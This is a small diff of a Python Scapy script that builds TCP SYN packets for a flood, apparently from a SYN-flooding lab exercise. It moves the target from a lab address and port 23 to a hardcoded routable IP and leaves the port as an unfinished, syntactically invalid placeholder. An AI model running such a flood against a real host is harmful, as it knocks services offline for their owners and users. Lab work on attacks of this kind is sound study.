@@ -4,8 +4,11 @@ from scapy.all import IP, TCP, send
 from ipaddress import IPv4Address
 from random import getrandbits
 
-ip  = IP(dst="10.9.0.5")
-tcp = TCP(dport=23, flags='S')
+VM_IP = "153.90.6.209"
+WebPagePort = // Need to choose which port
+
+ip  = IP(dst=VM_IP)
+tcp = TCP(dport=WebPagePort, flags='S')
 pkt = ip/tcp
 
 while True:
